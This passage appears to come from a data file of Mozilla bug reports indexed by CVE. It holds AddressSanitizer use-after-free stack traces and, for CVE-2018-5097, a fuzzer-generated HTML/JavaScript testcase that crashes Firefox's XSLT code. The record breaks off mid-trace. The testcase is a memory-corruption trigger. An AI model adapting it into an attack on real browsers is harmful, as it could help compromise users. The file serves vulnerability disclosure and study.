/home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #51 0x7f8e70587d5f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #52 0x7f8e704f98b8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #53 0x7f8e704f98b8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #54 0x7f8e704f98b8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #55 0x7f8e75b9ac6f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #56 0x7f8e77c19071 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #57 0x7f8e77db0387 in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #58 0x7f8e77db1afd in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #59 0x7f8e77db29bc in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #60 0x4df91a in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #61 0x4df91a in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #62 0x7f8e8b1b882f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #63 0x41ba88 in _start (/fuzzer3/esr/firefox/firefox+0x41ba88) 0x6150007751b0 is located 48 bytes inside of 496-byte region [0x615000775180,0x615000775370) freed by thread T0 here: #0 0x4b21db in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f8e6f615744 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2665:9 #2 0x7f8e6f615336 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2840:3 #3 0x7f8e6f61c40e in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3826:3 #4 0x7f8e6f61b8cc in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3651:9 #5 0x7f8e6f61f946 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4144:3 #6 0x7f8e724bc769 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1440:3 #7 0x7f8e71fe648d in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1340:3 #8 0x7f8e6f7752b6 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_x86_64_unix.cpp:180:23 #9 0x7f8e70f9c7be in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2058:12 #10 0x7f8e70f9c7be in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1377 #11 0x7f8e70f9c7be in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1344 #12 0x7f8e70fa3e48 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1000:12 #13 0x7f8e7a26e375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #14 0x7f8e7a26e375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #15 0x7f8e7a24e77f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #16 0x7f8e7a24e77f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #17 0x7f8e7a23393d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #18 0x7f8e7a26e9df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #19 0x7f8e7a26f022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #20 0x7f8e79d3da12 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #21 0x7f8e70ec416f in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #22 0x7f8e7a26e375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #23 0x7f8e7a26e375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #24 0x7f8e7a24e77f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #25 0x7f8e7a24e77f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #26 0x7f8e7a23393d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #27 0x7f8e7a26e9df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #28 0x7f8e7a26f022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #29 0x7f8e79d3fc7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #30 0x7f8e738cbfcc in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:47:8 #31 0x7f8e742c3662 in HandleEvent<mozilla::dom::EventTarget *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:64:12 #32 0x7f8e742c3662 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1130 #33 0x7f8e742c50d7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #34 0x7f8e742b00f9 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:401:9 #35 0x7f8e742b34c8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #36 0x7f8e742b53c7 in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:780:12 previously allocated by thread T0 here: #0 0x4b24fb in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0ded in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f8e744f38a9 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f8e744f38a9 in NS_NewHTMLInputElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:129 #4 0x7f8e7469a756 in CreateHTMLElement /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:291:41 #5 0x7f8e7469a756 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString_internal const*) /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:263 #6 0x7f8e724f5638 in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString_internal const*) /home/worker/workspace/build/src/dom/base/nsNameSpaceManager.cpp:177:12 #7 0x7f8e723afda1 in nsDocument::CreateElementNS(nsAString_internal const&, nsAString_internal const&, mozilla::dom::ElementCreationOptionsOrString const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5481:8 #8 0x7f8e739044b9 in mozilla::dom::DocumentBinding::createElementNS(JSContext*, JS::Handle<JSObject*>, nsIDocument*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/DocumentBinding.cpp:1084:53 #9 0x7f8e73edf5f9 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2904:13 #10 0x7f8e7a26e375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #11 0x7f8e7a26e375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #12 0x7f8e7a24e77f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #13 0x7f8e7a24e77f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #14 0x7f8e7a23393d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #15 0x7f8e7a26e9df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #16 0x7f8e7a26f022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #17 0x7f8e79d3fc7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #18 0x7f8e738c8bcf in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #19 0x7f8e742f930a in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #20 0x7f8e742f930a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #21 0x7f8e742c36ad in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #22 0x7f8e742c50d7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #23 0x7f8e742afe36 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #24 0x7f8e742b34c8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #25 0x7f8e764ab21c in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1047:7 #26 0x7f8e7725008b in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7638:5 #27 0x7f8e7724be94 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7442:7 #28 0x7f8e772534ff in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7339:13 #29 0x7f8e713dcdc0 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1255:3 #30 0x7f8e713dbd58 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:840:5 #31 0x7f8e713d8ab8 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:730:9 #32 0x7f8e713dabb4 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:612:5 #33 0x7f8e713db76c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:468:14 #34 0x7f8e6f92c6ca in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:633:18 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/base/nsINode.h:1630:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c2a800e69e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2a800e69f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2a800e6a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2a800e6a10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2a800e6a20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c2a800e6a30: fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd 0x0c2a800e6a40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a800e6a50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a800e6a60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa 0x0c2a800e6a70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2a800e6a80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==1018==ABORTING"
      }
    ],
    "CVE-2018-5097": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1387427",
        "title": "heap-use-after-free in txNameTest::matches",
        "description": "The following testcase crashes the latest ASAN build of Firefox (57.0a1, BuildID=20170803031846). It requires the attached ctop.xsl, mathml.xsl, math.xml and pmathml.xsl <script> function start() { o0=document; document.documentElement.innerHTML=\"\";; o16=o0.createElement('iframe'); o16.src='math.xml'; o19=o0.createElement('element'); o22=document.documentElement.querySelector('*:not([id])'); document.documentElement.appendChild(o16); o33=o0.createElement('marquee'); o33.addEventListener('DOMAttrModified',fun0); o33.style.objectPosition='341cm'; } function fun0() { o16.src='javascript:window.top.fun1(document)'; o39=o0.createElement('style'); o22.appendChild(o39); } function fun1(a) { o52=a; o53=o52.querySelector('*:not([id])'); o53.id='id7'; o39.replaceWith(undefined,o19); o79=o52.querySelector('*:not([id])'); o19.innerHTML='<script>window.top.fun2()</'+'script>'; o79.before(o22); } function fun2() { o53.textContent=\"a\"; fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ASAN ouput: ================================================================= ==6027==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c000195f5c at pc 0x7fe871141b2e bp 0x7fffeab00210 sp 0x7fffeab00208 READ of size 4 at 0x60c000195f5c thread T0 (Web Content) #0 0x7fe871141b2d in GetBoolFlag /home/worker/workspace/build/src/obj-firefox/dist/include/nsINode.h:1602:12 #1 0x7fe871141b2d in IsElement /home/worker/workspace/build/src/obj-firefox/dist/include/nsINode.h:440 #2 0x7fe871141b2d in isElement /home/worker/workspace/build/src/dom/xslt/xpath/txXPathTreeWalker.h:225 #3 0x7fe871141b2d in txNameTest::matches(txXPathNode const&, txIMatchContext*, bool&) /home/worker/workspace/build/src/dom/xslt/xpath/txNameTest.cpp:31 #4 0x7fe87114b2f5 in txPredicatedNodeTest::matches(txXPathNode const&, txIMatchContext*, bool&) /home/worker/workspace/build/src/dom/xslt/xpath/txPredicatedNodeTest.cpp:24:30 #5 0x7fe8711d1e86 in txStepPattern::matches(txXPathNode const&, txIMatchContext*, bool&) /home/worker/workspace/build/src/dom/xslt/xslt/txXSLTPatterns.cpp:438:30 #6 0x7fe8711b3514 in txStylesheet::findTemplate(txXPathNode const&, txExpandedName const&, txIMatchContext*, txStylesheet::ImportFrame*, txInstruction**, txStylesheet::ImportFrame**) /home/worker/workspace/build/src/dom/xslt/xslt/txStylesheet.cpp:133:45 #7 0x7fe87117045a in txApplyTemplates::execute(txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txInstructions.cpp:85:26 #8 0x7fe8711d347d in txXSLTProcessor::execute(txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txXSLTProcessor.cpp:49:21 #9 0x7fe87119ce9a in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:679:14 #10 0x7fe8711aded3 in nsTransformBlockerEvent::Run() /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:562:17 #11 0x7fe86afd64ce in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1446:14 #12 0x7fe86afdc748 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:480:10 #13 0x7fe86bdee181 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #14 0x7fe86bd4b64b in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #15 0x7fe86bd4b64b in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #16 0x7fe86bd4b64b in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #17 0x7fe87159c08f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #18 0x7fe875873c77 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:882:22 #19 0x7fe86bd4b64b in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #20 0x7fe86bd4b64b in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #21 0x7fe86bd4b64b in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #22 0x7fe8758736e0 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:699:34 #23 0x4eb843 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #24 0x4eb843 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:285 #25 0x7fe8888e182f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291 #26 0x41d198 in _start (/home/nils/fuzzer3/firefox/firefox+0x41d198) 0x60c000195f5c is located 28 bytes inside of 128-byte region [0x60c000195f40,0x60c000195fc0) freed by thread T0 (Web Content) here: #0 0x4bb6cb in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7fe86ae71547 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2658:25 #2 0x7fe86ae7870b in FreeSnowWhite /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2846:3 #3 0x7fe86ae7870b in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3850 #4 0x7fe86ae77c23 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3671:9 #5 0x7fe86ae7b950 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4208:21 #6 0x7fe86dd5d77d in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1670:3 #7 0x7fe86d8a297b in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1410:3 #8 0x7fe86aff5bf1 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:129 #9 0x7fe86c8c91a0 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1996:12 #10 0x7fe86c8c91a0 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1315 #11 0x7fe86c8c91a0 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1282 #12 0x7fe86c8d016f in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:967:12 #13 0x7fe875d56a24 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #14 0x7fe875d56a24 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:469 #15 0x7fe875d3faa5 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:520:12 #16 0x7fe875d3faa5 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3064 #17 0x7fe875d26b19 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:409:12 #18 0x7fe875d56bbc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:487:15 #19 0x7fe875d57512 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:533:10 #20 0x7fe876751983 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2890:12 #21 0x7fe86c7eb28b in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #22 0x7fe875d56a24 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #23 0x7fe875d56a24 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:469 #24 0x7fe875d3faa5 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:520:12 #25 0x7fe875d3faa5 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3064 #26 0x7fe875d26b19 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:409:12 #27 0x7fe875d56bbc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:487:15 #28 0x7fe875d57512 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:533:10 #29 0x7fe876a095be in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:169:12 #30 0x7fe8769bce19 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:359:23 #31 0x7fe8769e98a3 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:481:21 #32 0x7fe8769ec267 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:741:12 #33 0x7fe875d56e6c in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #34 0x7fe875d56e6c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:451 #35 0x7fe875d3faa5 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:520:12 #36 0x7fe875d3faa5 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3064 #37 0x7fe875d26b19 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:409:12 #38 0x7fe875d59337 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:698:15 previously allocated by thread T0 (Web Content) here: #0 0x4bba1c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ecf3d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7fe8710fff27 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:200:12 #3 0x7fe8710fff27 in nsXMLContentSink::FlushText(bool) /home/worker/workspace/build/src/dom/xml/nsXMLContentSink.cpp:772 #4 0x7fe871101bee in nsXMLContentSink::HandleEndElement(char16_t const*, bool) /home/worker/workspace/build/src/dom/xml/nsXMLContentSink.cpp:1038:3 #5 0x7fe86cbac6d1 in HandleEndElement /home/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:395:26 #6 0x7fe86cbac6d1 in Driver_HandleEndElement(void*, char16_t const*) /home/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:76 #7 0x7fe87367118a in doContent /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:2554:11 #8 0x7fe87366565a in contentProcessor /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:2098:27 #9 0x7fe87366565a in doProlog /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:4078 #10 0x7fe87365c0bd in prologProcessor 